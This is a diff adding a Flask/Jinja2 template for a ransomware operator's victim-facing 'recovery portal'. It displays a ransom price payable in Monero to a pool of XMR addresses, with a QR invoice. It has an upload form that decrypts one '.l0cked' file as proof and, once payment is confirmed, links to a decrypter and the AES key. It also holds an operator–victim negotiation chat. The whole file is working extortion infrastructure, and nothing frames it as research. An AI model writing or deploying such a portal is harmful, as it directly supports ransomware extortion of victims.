@@ -1,0 +1,128 @@
+{% extends "base.html" %}
+{% block title %}recovery portal{% endblock %}
+{% block bodyclass %}portal{% endblock %}
+{% block content %}
+<section class="hero">
+  <div class="eyebrow">Secure recovery portal</div>
+  <h1>{{ s.portal_title }}</h1>
+  <p class="sub" style="max-width:720px">{{ s.portal_intro }}</p>
+  <div class="statrow">
+    <span class="badge armed">invoice {{ invoice }}</span>
+    {% if deadline %}<span class="badge">deadline {{ deadline }}</span>{% endif %}
+    {% if paid %}<span class="badge on">payment confirmed</span>{% else %}<span class="badge off">awaiting payment</span>{% endif %}
+  </div>
+</section>
+
+<div class="grid">
+  <div class="panel">
+    <h2>Payment</h2>
+    <div class="amount">${{ "{:,.0f}".format(price_due or (v['price'] or (s.price_usd|float))) }} <small>USD</small></div>
+    <p class="sub small">settled in Monero (XMR)</p>
+    <label>XMR address</label>
+    {% set pool = (s.xmr_addresses or '').splitlines() | map('trim') | select | list %}
+    {% if v['xmr_address'] or not pool %}
+    <div class="copyrow">
+      <code id="xmr">{{ v['xmr_address'] or s.xmr_address }}</code>
+      <button class="btn dim" type="button" data-copy="#xmr">copy</button>
+    </div>
+    {% else %}
+    {% for addr in pool %}
+    <div class="copyrow" style="margin-bottom:6px">
+      <code>{{ addr }}</code>
+      <button class="btn dim" type="button" data-copy="#addr{{ loop.index }}">copy</button>
+    </div>
+    <span id="addr{{ loop.index }}" style="display:none">{{ addr }}</span>
+    {% endfor %}
+    {% endif %}
+    <label>invoice</label>
+    <div class="copyrow"><code id="inv">{{ invoice }}</code>
+      <button class="btn dim" type="button" data-copy="#inv">copy</button></div>
+    {% if v['sample_path'] %}<p class="sub small" style="margin-top:12px">verification sample: <code>{{ v['sample_path'] }}</code></p>{% endif %}
+    {% if paid_total %}<p class="small">credited so far: <b>${{ "%.2f"|format(paid_total) }}</b></p>{% endif %}
+    <p style="margin-top:12px"><img src="{{ url_for('portal_invoice_qr') }}" alt="invoice QR" style="width:150px;height:150px;background:#fff;padding:6px"></p>
+    <p class="sub small">Scan to pay this invoice in a Monero wallet.</p>
+    <p class="sub small" style="margin-top:12px">After the transaction is verified, the decryption key is released on this page.</p>
+  </div>
+
+  <div class="panel">
+    <h2>Proof of decryption</h2>
+    {% if paid %}
+      <span class="badge on" style="margin-bottom:12px">payment confirmed</span>
+      {% if aes_display %}
+      <p style="margin-top:14px">
+        <a class="btn" href="{{ url_for('portal_decrypter') }}">DOWNLOAD DECRYPTER (.CPP)</a>
+        {% if exe_build_available %}<a class="btn" href="{{ url_for('portal_decrypter_exe') }}">DOWNLOAD .EXE</a>
+        <a class="btn dim" href="{{ url_for('portal_decrypter_exe', arch='x86') }}">DOWNLOAD .EXE (x86)</a>{% endif %}
+      </p>
+      <label>your key</label>
+      <code>{{ aes_display }}</code>
+      {% else %}<p class="sub">waiting for the operator to release the key…</p>{% endif %}
+    {% elif s.proof_enabled == '1' and aes_display %}
+      <p class="sub">Upload one encrypted file (max {{ s.proof_max_mb }} MB). We return the plaintext so you can verify the key — the key itself stays with us.</p>
+      <form method="post" action="{{ url_for('portal_proof') }}" enctype="multipart/form-data">
+        <input type="hidden" name="csrf" value="{{ csrf_token }}">
+        <input type="file" name="sample" accept=".l0cked" required>
+        <button class="btn wide" type="submit" style="margin-top:10px">DECRYPT SAMPLE</button>
+      </form>
+    {% else %}
+      <p class="sub">proof uploads are currently disabled.</p>
+    {% endif %}
+  </div>
+</div>
+
+<div class="panel" style="margin-top:16px">
+  <h2>Invoice history</h2>
+  <table>
+    <tr><th>invoice</th><th>amount</th><th>status</th><th>created</th></tr>
+    {% for i in invoices %}
+    <tr><td>{{ i['number'] }}</td><td>${{ '%.2f'|format(i['amount'] or 0) }}</td>
+      <td>{{ i['status'] }}</td><td class="small">{{ i['created'] }}</td></tr>
+    {% else %}<tr><td colspan="4" class="sub">no invoices</td></tr>{% endfor %}
+  </table>
+</div>
+
+<div class="panel" style="margin-top:16px">
+  <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap">
+    <h2 style="margin:0">Negotiation channel</h2>
+    <span class="badge off">encrypted transport</span>
+    <span style="margin-left:auto"><a class="btn dim" href="{{ url_for('portal_invoice') }}">invoice PDF</a></span>
+  </div>
+  <div class="chat" style="margin-top:12px">
+    {% for m in chat %}
+      <div class="{{ 'm-admin' if m.sender=='ADMIN' else 'm-victim' }}">
+        <span class="m-time">{{ m.time }}</span>
+        <b>{{ m.sender|capitalize }}:</b> {{ m.msg }}
+        {% if m.attachment %}<a href="{{ url_for('chat_file', name=m.attachment) }}">[file]</a>{% endif %}</div>
+    {% else %}<div class="sub">no messages yet — send a message to the operator below.</div>{% endfor %}
+  </div>
+  <form method="post" enctype="multipart/form-data">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <input name="message" placeholder="Write to the operator…" autocomplete="off">
+    <div style="height:8px"></div>
+    <input type="file" name="attachment">
+    <div style="height:10px"></div>
+    <button class="btn" type="submit">SEND MESSAGE</button>
+  </form>
+  <script>
+  (function(){
+    var last = {{ chat[-1].id if chat else 0 }};
+    setInterval(function(){
+      fetch("{{ url_for('portal_chat_json') }}?since=" + last)
+        .then(function(r){ return r.json(); })
+        .then(function(j){ if (j.messages && j.messages.length) location.reload(); })
+        .catch(function(){});
+    }, 5000);
+    document.querySelectorAll("[data-copy]").forEach(function(b){
+      b.addEventListener("click", function(){
+        var el = document.querySelector(b.getAttribute("data-copy"));
+        if (!el) return;
+        navigator.clipboard.writeText(el.textContent.trim()).then(function(){
+          var old = b.textContent; b.textContent = "copied"; setTimeout(function(){ b.textContent = old; }, 1200);
+        });
+      });
+    });
+  })();
+  </script>
+  <p class="small sub" style="margin-top:14px"><a href="{{ url_for('portal_logout') }}">log out</a></p>
+</div>
+{% endblock %}
